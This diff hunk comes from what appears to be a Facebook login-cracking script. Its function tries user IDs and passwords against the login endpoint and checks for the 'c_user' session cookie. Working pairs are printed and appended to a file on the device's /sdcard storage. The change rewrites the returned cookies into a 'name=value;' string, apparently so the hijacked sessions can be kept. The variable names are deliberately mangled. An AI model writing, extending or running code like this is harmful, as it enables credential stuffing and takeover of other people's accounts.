@@ -1101,7 +1101,12 @@ def gxds_files(uid, pxss):
                 data=dxta,
                 headers=headxr,
             ).text
-            lxgin = session.cookies.get_dict().keys()
+            lxgin = (
+                str(req.cookies.get_dict())[1:-1]
+                .replace("'", "")
+                .replace(",", ";")
+                .replace(":", "=")
+            )
             if "c_user" in lxgin:
                 print('\r\r\033[1;32m  [GXDS-✓] '+uid+':'+ps+' - '+yxxr(uid))
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
